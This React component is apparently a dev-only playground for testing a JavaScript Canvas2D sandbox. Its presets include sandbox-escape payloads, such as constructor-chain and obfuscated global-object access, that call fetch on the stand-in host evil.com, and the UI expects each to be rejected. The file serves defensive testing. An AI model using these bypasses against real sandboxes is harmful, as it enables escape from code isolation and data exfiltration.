import React, { useState, useEffect, useRef, useCallback } from 'react';
import { useSandboxStore } from '../store/sandboxStore';
import { analyzeCodeSafety } from '../sandbox/static-analyzer';
import { SandboxedCodeExecutor } from '../sandbox/sandboxed-code-executor';
import {
  PULSING_CIRCLE_CODE,
  RANDOM_PARTICLES_CODE,
  INFINITE_LOOP_CODE,
  MALICIOUS_SAMPLES,
} from '../sandbox/sample-codes';

interface PresetItem {
  id: string;
  label: string;
  tag: string;
  expected: 'DITERIMA' | 'DITOLAK';
  description: string;
  code: string;
}

const PRESETS: PresetItem[] = [
  {
    id: 'normal',
    label: 'Kode Normal',
    tag: 'Safe',
    expected: 'DITERIMA',
    description: 'Lingkaran berdenyut periodik t: 0.0 → 1.0',
    code: PULSING_CIRCLE_CODE,
  },
  {
    id: 'random',
    label: 'Kode Pakai Random',
    tag: 'Seeded PRNG',
    expected: 'DITERIMA',
    description: 'Partikel prosedural dengan opts.random() (Mulberry32)',
    code: RANDOM_PARTICLES_CODE,
  },
  {
    id: 'infinite',
    label: 'Kode Infinite Loop',
    tag: 'Timeout 50ms',
    expected: 'DITOLAK',
    description: 'Loop tak hingga (while true) — uji watchdog guard',
    code: INFINITE_LOOP_CODE,
  },
  {
    id: 'window',
    label: 'Kode Coba Akses window',
    tag: 'Static Check',
    expected: 'DITOLAK',
    description: 'Mencoba redirect window.location.href',
    code: MALICIOUS_SAMPLES.windowAccessAttempt,
  },
  {
    id: 'fetch',
    label: 'Kode Coba Fetch',
    tag: 'Static Check',
    expected: 'DITOLAK',
    description: 'Mencoba memanggil network fetch()',
    code: MALICIOUS_SAMPLES.fetchAttempt,
  },
  {
    id: 'constructor-chain',
    label: 'Kode Coba Bypass (Constructor Chain)',
    tag: 'Bypass Check',
    expected: 'DITOLAK',
    description: 'Bypass via constructor chain: this.constructor.constructor("return this")().fetch(...)',
    code: 'this.constructor.constructor("return this")().fetch("https://evil.com");',
  },
  {
    id: 'string-obfuscation',
    label: 'Kode Coba Bypass (String Obfuscation)',
    tag: 'Obfuscation',
    expected: 'DITOLAK',
    description: 'Bypass via string obfuscation: const key = \'con\' + \'struct\' + \'or\'; this[key][key](\'return this\')()[\'fe\' + \'tch\'](...)',
    code: "const key = 'con' + 'struct' + 'or';\nthis[key][key]('return this')()['fe' + 'tch']('https://evil.com');",
  },
  {
    id: 'dynamic-discovery',
    label: 'Kode Coba Bypass (Dynamic Discovery)',
    tag: 'Dynamic Discovery',
    expected: 'DITOLAK',
    description: 'Bypass via dynamic property discovery on prototype without literal keywords',
    code: "const proto = ({}).__proto__;\nconst names = Object.getOwnPropertyNames(proto);\nconst targetKey = names.find(function(n) { return n.length === 11 && n.charCodeAt(0) === 99; });\nconst g = ({})[targetKey][targetKey]('return this')();\nconst fnKey = ['f','e','t','c','h'].join('');\ng[fnKey]('https://evil.com');",
  },
  {
    id: 'layer2-defense',
    label: 'Kode Coba Bypass (Lolos L1, Tertahan L2)',
    tag: 'Layer 2 Defense',
    expected: 'DITOLAK',
    description: 'Lolos static analysis tanpa blacklist, tertahan di Worker runtime karena fetch dinetralkan',
    code: "const p = Object.getPrototypeOf({});\nconst keys = Object.getOwnPropertyNames(p);\nconst cKey = keys.find(function(k) { return k.startsWith('c') && k.endsWith('r') && k.length === 11; });\nconst F = ({})[cKey][cKey];\nconst g = F('return this')();\nconst fKey = String.fromCharCode(102, 101, 116, 99, 104);\nconst fn = g[fKey];\nif (typeof fn === 'function') {\n  fn('https://evil.com');\n} else {\n  throw new Error('Layer 2 Block: target is ' + typeof fn);\n}",
  },
];

export function SandboxPlaygroundModal() {
  const { isOpen, closeModal, openModal } = useSandboxStore();
  const [code, setCode] = useState<string>(PULSING_CIRCLE_CODE);
  const [tValue, setTValue] = useState<number>(0.5);
  const [activePreset, setActivePreset] = useState<string>('normal');
  const [status, setStatus] = useState<'IDLE' | 'RUNNING' | 'ACCEPTED' | 'REJECTED'>('IDLE');
  const [statusReason, setStatusReason] = useState<string>('');
  const [errorDetails, setErrorDetails] = useState<string[]>([]);
  const [executionTimeMs, setExecutionTimeMs] = useState<number | null>(null);

  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const executorRef = useRef<SandboxedCodeExecutor | null>(null);

  // Initialize host executor
  useEffect(() => {
    const executor = new SandboxedCodeExecutor({ defaultTimeoutMs: 1000 });
    executor.warmup();
    executorRef.current = executor;
    return () => {
      executorRef.current?.dispose();
      executorRef.current = null;
    };
  }, []);

  // Listen for ?sandbox-test or ?sandbox in URL (DEV mode only)
  useEffect(() => {
    if (!import.meta.env.DEV) return;
    const params = new URLSearchParams(window.location.search);
    if (params.has('sandbox-test') || params.has('sandbox')) {
      openModal();
    }
  }, [openModal]);

  const runSandboxTest = useCallback(
    async (codeToTest: string, currentT: number) => {
      setStatus('RUNNING');
      setStatusReason('Sedang memeriksa static analysis dan mengeksekusi...');
      setErrorDetails([]);
      setExecutionTimeMs(null);

      const startTime = performance.now();

      // Step 1: Pre-Execution Static Analysis Gate
      const analysis = analyzeCodeSafety(codeToTest);
      if (!analysis.valid) {
        setStatus('REJECTED');
        setStatusReason('DITOLAK oleh Pre-Execution Static Analysis (Identifier / Bypass Terlarang)');
        setErrorDetails(analysis.errors);
        setExecutionTimeMs(performance.now() - startTime);

        // Clear canvas
        if (canvasRef.current) {
          const ctx = canvasRef.current.getContext('2d');
          if (ctx) {
            ctx.clearRect(0, 0, 360, 360);
          }
        }
        return;
      }

      // Step 2: Execution in Sandboxed Worker with Watchdog Guard
      try {
        if (executorRef.current) {
          const result = await executorRef.current.executeFrame({
            code: codeToTest,
            t: currentT,
            width: 360,
            height: 360,
            opts: { seed: 1337 },
            timeoutMs: 1000,
          });

          if (!result.success) {
            setStatus('REJECTED');
            if (result.timedOut) {
              setStatusReason('DITOLAK: Watchdog Timeout Guard (> 1000ms) — Worker Dihentikan Paksa');
              setErrorDetails([
                result.error || 'Eksekusi fungsi drawFrame() melebihi batas waktu aman.',
                'Worker di-terminate untuk mencegah thread freeze / infinite loop.',
              ]);
            } else {
              setStatusReason('DITOLAK: Runtime Execution Error');
              setErrorDetails([result.error || 'Terjadi kesalahan eksekusi dalam sandbox.']);
            }
            setExecutionTimeMs(result.executionTimeMs);

            if (canvasRef.current) {
              const ctx = canvasRef.current.getContext('2d');
              ctx?.clearRect(0, 0, 360, 360);
            }
            return;
          }

          // Render result to preview canvas (only from sandboxed worker result)
          const canvas = canvasRef.current;
          if (canvas) {
            const ctx = canvas.getContext('2d');
            if (ctx) {
              ctx.clearRect(0, 0, 360, 360);
              if (result.imageBitmap) {
                ctx.drawImage(result.imageBitmap, 0, 0, 360, 360);
              } else if (result.imageData) {
                ctx.putImageData(result.imageData, 0, 0);
              }
            }
          }

          setStatus('ACCEPTED');
          setStatusReason('DITERIMA: Kode Lolos Static Analysis & Selesai Dieksekusi Aman');
          setExecutionTimeMs(result.executionTimeMs);
        }
      } catch (err) {
        setStatus('REJECTED');
        setStatusReason('DITOLAK: Kesalahan Tidak Terduga');
        setErrorDetails([err instanceof Error ? err.message : String(err)]);
        setExecutionTimeMs(performance.now() - startTime);

        if (canvasRef.current) {
          const ctx = canvasRef.current.getContext('2d');
          ctx?.clearRect(0, 0, 360, 360);
        }
      }
    },
    []
  );

  // Auto-run when modal opens first time
  useEffect(() => {
    if (isOpen && status === 'IDLE') {
      runSandboxTest(code, tValue);
    }
  }, [isOpen, status, code, tValue, runSandboxTest]);

  if (!import.meta.env.DEV || !isOpen) {
    return null;
  }

  const handleSelectPreset = (preset: PresetItem) => {
    setActivePreset(preset.id);
    setCode(preset.code);
    runSandboxTest(preset.code, tValue);
  };

  const handleTChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = parseFloat(e.target.value);
    setTValue(val);
    if (status === 'ACCEPTED') {
      runSandboxTest(code, val);
    }
  };

  return (
    <div
      id="sandbox-playground-backdrop"
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-fade-in"
    >
      <div
        id="sandbox-playground-modal"
        className="w-full max-w-5xl max-h-[90vh] flex flex-col bg-[#0f0c1b] border border-purple-500/40 rounded-xl shadow-2xl overflow-hidden font-sans text-white"
      >
        {/* Modal Header */}
        <div className="flex items-center justify-between px-6 py-3 border-b border-purple-500/30 bg-[#161228]">
          <div className="flex items-center gap-2">
            <span className="text-xl">🧪</span>
            <div>
              <h2 className="text-sm font-bold text-white tracking-wide uppercase flex items-center gap-2">
                Canvas2D Sandbox Playground
                <span className="text-[10px] px-2 py-0.5 rounded bg-purple-950 text-purple-300 border border-purple-500/40">
                  DEV ONLY • v2.0
                </span>
              </h2>
              <p className="text-[11px] text-gray-400">
                Uji isolasi kode Canvas2D, static analysis scanner, Mulberry32 PRNG, dan 50ms watchdog timeout guard.
              </p>
            </div>
          </div>
          <button
            id="btn-close-sandbox"
            onClick={closeModal}
            className="w-7 h-7 flex items-center justify-center rounded-lg bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white transition-colors cursor-pointer text-sm"
          >
            ✕
          </button>
        </div>

        {/* Preset Chips Row */}
        <div className="flex items-center gap-2 px-6 py-2.5 bg-[#130f24] border-b border-purple-500/20 overflow-x-auto">
          <span className="text-[11px] text-gray-400 font-semibold uppercase tracking-wider flex-shrink-0">
            Presets Uji:
          </span>
          {PRESETS.map((preset) => {
            const isActive = activePreset === preset.id;
            const isExpectedAccepted = preset.expected === 'DITERIMA';
            return (
              <button
                key={preset.id}
                id={`preset-${preset.id}`}
                onClick={() => handleSelectPreset(preset)}
                className={`flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium transition-all cursor-pointer flex-shrink-0 border ${
                  isActive
                    ? 'bg-purple-600 text-white border-purple-400 shadow-md scale-105'
                    : 'bg-gray-800/80 text-gray-300 border-gray-700 hover:bg-gray-700 hover:text-white'
                }`}
                title={preset.description}
              >
                <span>{isExpectedAccepted ? '🟢' : '🔴'}</span>
                <span>{preset.label}</span>
                <span className="text-[10px] opacity-75">({preset.tag})</span>
              </button>
            );
          })}
        </div>

        {/* Modal Body: 2 Columns */}
        <div className="flex-1 flex min-h-0 overflow-hidden p-6 gap-6">
          {/* Left Column: Code Editor & Controls */}
          <div className="flex-1 flex flex-col min-w-0 gap-3">
            <div className="flex items-center justify-between text-xs text-gray-400">
              <label htmlFor="sandbox-code-editor" className="font-semibold text-gray-300">
                Fungsi drawFrame(ctx, t, width, height, opts) Script Body:
              </label>
              <span>JavaScript (Strict Sandbox)</span>
            </div>

            <textarea
              id="sandbox-code-editor"
              value={code}
              onChange={(e) => {
                setCode(e.target.value);
                setActivePreset('custom');
                if (status !== 'IDLE') {
                  setStatus('IDLE');
                  setStatusReason('');
                  setErrorDetails([]);
                  setExecutionTimeMs(null);
                }
              }}
              className="flex-1 min-h-[300px] w-full p-3 font-mono text-xs bg-[#090712] border border-gray-800 rounded-lg text-emerald-300 focus:border-purple-500 focus:outline-none resize-none selection:bg-purple-900"
              placeholder="// Masukkan kode drawFrame di sini..."
              spellCheck={false}
            />

            {/* Controls: t slider & Test Sandbox Button */}
            <div className="flex items-center justify-between gap-4 p-3 bg-[#130f24] rounded-lg border border-purple-500/20">
              <div className="flex items-center gap-2 flex-1">
                <span className="text-xs text-gray-400 font-mono">t:</span>
                <input
                  id="sandbox-t-slider"
                  type="range"
                  min="0"
                  max="1"
                  step="0.01"
                  value={tValue}
                  onChange={handleTChange}
                  className="flex-1 accent-purple-500 cursor-pointer"
                />
                <span className="text-xs font-mono text-purple-300 w-10 text-right">
                  {tValue.toFixed(2)}
                </span>
              </div>

              <button
                id="btn-run-sandbox"
                onClick={() => runSandboxTest(code, tValue)}
                disabled={status === 'RUNNING'}
                className="px-5 py-2 rounded-lg font-bold text-xs uppercase tracking-wider bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white shadow-lg cursor-pointer transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
              >
                <span>⚡</span>
                <span>Test Sandbox</span>
              </button>
            </div>
          </div>

          {/* Right Column: Status & Preview Canvas */}
          <div className="w-[380px] flex flex-col gap-3 flex-shrink-0">
            <div className="text-xs font-semibold text-gray-300">Hasil Evaluasi Sandbox:</div>

            {/* Status Card Banner */}
            <div
              id="sandbox-status-card"
              className={`p-3.5 rounded-lg border flex flex-col gap-1 transition-all ${
                status === 'RUNNING'
                  ? 'bg-yellow-950/40 border-yellow-500/40 text-yellow-300'
                  : status === 'ACCEPTED'
                    ? 'bg-emerald-950/50 border-emerald-500/60 text-emerald-300'
                    : status === 'REJECTED'
                      ? 'bg-rose-950/60 border-rose-500/70 text-rose-300'
                      : 'bg-gray-900 border-gray-800 text-gray-400'
              }`}
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2 text-sm font-bold tracking-wide">
                  {status === 'RUNNING' && <span>⏳ MEMPROSES...</span>}
                  {status === 'ACCEPTED' && (
                    <span id="badge-status-accepted" className="flex items-center gap-1.5 text-emerald-400">
                      <span>✅</span>
                      <span>DITERIMA</span>
                    </span>
                  )}
                  {status === 'REJECTED' && (
                    <span id="badge-status-rejected" className="flex items-center gap-1.5 text-rose-400">
                      <span>❌</span>
                      <span>DITOLAK</span>
                    </span>
                  )}
                  {status === 'IDLE' && <span>⚪ READY</span>}
                </div>

                {executionTimeMs !== null && (
                  <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-black/40 border border-white/10">
                    ⏱ {executionTimeMs.toFixed(2)} ms
                  </span>
                )}
              </div>

              <p className="text-xs mt-1 leading-snug">{statusReason}</p>

              {/* Error Details Breakdown */}
              {errorDetails.length > 0 && (
                <div id="sandbox-error-details" className="mt-2 pt-2 border-t border-rose-500/30 text-[11px] text-rose-200">
                  <span className="font-semibold block mb-1">Rincian Pelanggaran Keamanan / Timeout:</span>
                  <ul className="list-disc list-inside space-y-1 font-mono text-[10px]">
                    {errorDetails.map((err, idx) => (
                      <li key={idx} className="break-words">
                        {err}
                      </li>
                    ))}
                  </ul>
                </div>
              )}
            </div>

            {/* Canvas Preview Box */}
            <div className="flex-1 flex flex-col items-center justify-center p-3 bg-[#090712] border border-gray-800 rounded-lg">
              <div className="relative w-[340px] h-[340px] bg-[#05040a] rounded border border-gray-800 flex items-center justify-center overflow-hidden">
                <canvas
                  id="sandbox-preview-canvas"
                  ref={canvasRef}
                  width={360}
                  height={360}
                  className="w-full h-full object-contain"
                />

                {status === 'REJECTED' && (
                  <div className="absolute inset-0 bg-black/80 flex flex-col items-center justify-center p-4 text-center">
                    <span className="text-3xl mb-1">🛡️</span>
                    <span className="text-xs font-bold text-rose-400 uppercase">Eksekusi Diblokir</span>
                    <span className="text-[10px] text-gray-400 mt-1 max-w-[240px]">
                      Kode tidak dijalankan pada canvas karena melanggar kebijakan keamanan atau batas waktu.
                    </span>
                  </div>
                )}
              </div>

              <div className="flex items-center justify-between w-full mt-2 text-[10px] text-gray-500 font-mono">
                <span>Preview: 360x360</span>
                <span>Seed: 1337 (Mulberry32)</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
